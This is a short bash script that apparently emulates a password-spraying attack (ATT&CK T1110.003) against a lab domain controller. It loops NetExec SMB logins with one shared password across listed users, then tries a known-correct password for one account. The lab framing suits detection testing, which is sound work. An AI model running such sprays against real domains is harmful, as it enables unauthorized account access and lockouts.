#!/usr/bin/env bash
# Lab-only password spray for ATT&CK T1110.003 against the lab DC.
# One password against many users = classic spray. CrackMapExec/nxc required.
DC="${1:-10.10.10.10}"
DOMAIN="${2:-lab.local}"
WRONG="Winter2025!"
RIGHT="Autumn2026!"
USERS="alice bob carol dave frank grace heidi ivan judy mallory"
echo "[*] Spray 1: wrong password across all users"
for u in $USERS; do nxc smb "$DC" -d "$DOMAIN" -u "$u" -p "$WRONG"; done
sleep 3
echo "[*] Spray 2: correct password finds erin"
nxc smb "$DC" -d "$DOMAIN" -u erin -p "$RIGHT"
